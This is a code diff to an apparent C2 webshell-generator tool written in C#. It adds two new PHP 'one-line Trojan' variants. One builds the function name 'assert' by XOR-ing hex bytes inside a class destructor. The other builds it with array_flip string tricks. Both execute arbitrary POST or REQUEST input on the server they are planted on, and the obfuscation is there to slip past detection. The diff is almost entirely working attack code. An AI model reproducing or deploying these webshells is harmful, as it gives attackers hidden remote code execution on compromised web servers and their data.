@@ -85,6 +85,12 @@ namespace C2.Business.CastleBravo.WebShellTool
                 case "一句话Trojan_变种9":
                     ret = GenOneWord9(Password);
                     break;
+                case "一句话Trojan_变种10":
+                    ret = GenOneWord10(Password);
+                    break;
+                case "一句话Trojan_变种11":
+                    ret = GenOneWord11(Password);
+                    break;
                 case "哥斯拉配套Trojan":
                     ret = GenGodzilla(Password, Key, EncryType);
                     break;
@@ -298,6 +304,46 @@ namespace C2.Business.CastleBravo.WebShellTool
             // 在菜刀里写 http://site/webshell.php?2=assert 密码是yxs
             // <?php ($_=@$_GET[2]).@$_($_POST['yxs'])?>
             return string.Format(@"<?ph" + @"p ($_=@$_GET" + "[2]).@$_($_PO" + @"ST['{0}'])?>", password);
+        }
+
+        private string GenOneWord10(string password)
+        {
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine(@"<?php ")
+              .AppendLine(@"class OSNL {")
+              .AppendLine(@"    function jLJs() {")
+              .AppendLine("        $hMHV = \"\\xf7\" ^ \"\\x96\";")
+              .AppendLine("        $IVwZ = \"\\x3e\" ^ \"\\x4d\";")
+              .AppendLine("        $BtPq = \"\\x79\" ^ \"\\xa\";")
+              .AppendLine("        $fMIS = \"\\x1\" ^ \"\\x64\";")
+              .AppendLine("        $GhZV = \"\\x5b\" ^ \"\\x29\";")
+              .AppendLine("        $Gvsv = \"\\x72\" ^ \"\\x6\";")
+              .AppendLine("        $ZmgF =$hMHV.$IVwZ.$BtPq.$fMIS.$GhZV.$Gvsv;")
+              .AppendLine("        return $ZmgF;")
+              .AppendLine("    }")
+              .AppendLine("    function __destruct(){")
+              .AppendLine("        $xvCv=$this->jLJs();")
+              .AppendLine("        @$xvCv($this->ox);")
+              .AppendLine("    }")
+              .AppendLine("}")
+              .AppendLine("$osnl = new OSNL();")
+              .AppendLine(string.Format("@$osnl->ox = isset($_GET['id'])?base64_decode($_POST['{0}']):$_POST['{0}'];", password))
+              .AppendLine(@"?>");
+            return sb.ToString();
+        }
+
+        private string GenOneWord11(string password)
+        {
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine(@"<?php ")
+              .AppendLine("$a1 = \"ass\";")
+              .AppendLine("$a2 = \"ert\";")
+              .AppendLine("$arr=array($a1.$a2=>\"test\");")
+              .AppendLine("$arr1=array_flip($arr);")
+              .AppendLine("$arr2 = \"$arr1[test]\";")
+              .AppendLine(string.Format("@$arr2($_REQUEST['{0}']);", password))
+              .AppendLine(@"?>");
+            return sb.ToString();
         }
 
     }
